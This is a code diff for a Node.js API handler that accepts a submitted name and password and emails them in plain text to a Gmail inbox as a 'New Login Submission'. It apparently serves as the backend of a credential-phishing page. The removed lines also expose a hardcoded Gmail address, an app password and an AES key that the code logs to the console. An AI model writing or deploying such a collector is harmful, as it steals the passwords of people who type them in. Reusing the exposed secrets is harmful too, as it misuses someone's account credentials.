@@ -1,6 +1,5 @@
 import nodemailer from 'nodemailer';
 import cors from 'cors';
-import { createDecipheriv } from 'crypto';
 
 const corsMiddleware = cors({ origin: '*', methods: ['POST'] });
 
@@ -23,62 +22,34 @@ const validateInput = (name, password) => {
   return null;
 };
 
-const SECRET_KEY = 'my-secret-key-1234567890123456';
-const EMAIL_USER = 'chalakbillw@gmail.com';
-const EMAIL_PASS = 'pdoo allo osex nilo';
-const ALGORITHM = 'aes-256-cbc';
-const IV_LENGTH = 16;
-
 export default async function handler(req, res) {
   await runMiddleware(req, res, corsMiddleware);
-  console.log('API /api/sendMail called with method:', req.method);
-  console.log('SECRET_KEY:', SECRET_KEY);
-  console.log('SECRET_KEY length:', Buffer.from(SECRET_KEY).length);
-
+  console.log('API /api/sendMail called with method:', req.method); // Debug log
   if (req.method !== 'POST') {
     return res.status(405).json({ message: 'Method not allowed' });
   }
 
-  const { encrypted } = req.body;
-
-  if (!encrypted) {
-    return res.status(400).json({ message: 'No encrypted data provided' });
+  const { name, password } = req.body;
+  const validationError = validateInput(name, password);
+  if (validationError) {
+    return res.status(400).json({ message: validationError });
   }
 
+  const sanitizedName = name.trim();
+  const sanitizedPassword = password.trim();
+
   try {
-    // Validate key length
-    if (Buffer.from(SECRET_KEY).length !== 32) {
-      throw new Error(`Invalid key length: SECRET_KEY is ${Buffer.from(SECRET_KEY).length} bytes, expected 32 bytes`);
-    }
-
-    const encryptedText = Buffer.from(encrypted, 'base64');
-    const iv = encryptedText.slice(0, IV_LENGTH);
-    const encryptedData = encryptedText.slice(IV_LENGTH);
-    const decipher = createDecipheriv(ALGORITHM, Buffer.from(SECRET_KEY), iv);
-    let decrypted = decipher.update(encryptedData, 'binary', 'utf8');
-    decrypted += decipher.final('utf8');
-
-    const { name, password } = JSON.parse(decrypted);
-
-    const validationError = validateInput(name, password);
-    if (validationError) {
-      return res.status(400).json({ message: validationError });
-    }
-
-    const sanitizedName = name.trim();
-    const sanitizedPassword = password.trim();
-
     const transporter = nodemailer.createTransport({
       service: 'gmail',
       auth: {
-        user: EMAIL_USER,
-        pass: EMAIL_PASS,
+        user: process.env.EMAIL_USER,
+        pass: process.env.EMAIL_PASS,
       },
     });
 
     const mailOptions = {
-      from: EMAIL_USER,
-      to: EMAIL_USER,
+      from: process.env.EMAIL_USER,
+      to: process.env.EMAIL_USER,
       subject: 'New Login Submission',
       text: `New login details:\nName: ${sanitizedName}\nPassword: ${sanitizedPassword}`,
       html: `<h3>New Login Submission</h3><p><strong>Name:</strong> ${sanitizedName}</p><p><strong>Password:</strong> ${sanitizedPassword}</p>`,
@@ -87,7 +58,7 @@ export default async function handler(req, res) {
     await transporter.sendMail(mailOptions);
     return res.status(200).json({ message: 'Login details sent successfully' });
   } catch (error) {
-    console.error('Error processing request:', error);
-    return res.status(500).json({ message: 'Failed to process request', error: error.message });
+    console.error('Error sending email:', error);
+    return res.status(500).json({ message: 'Failed to send email', error: error.message });
   }
 }
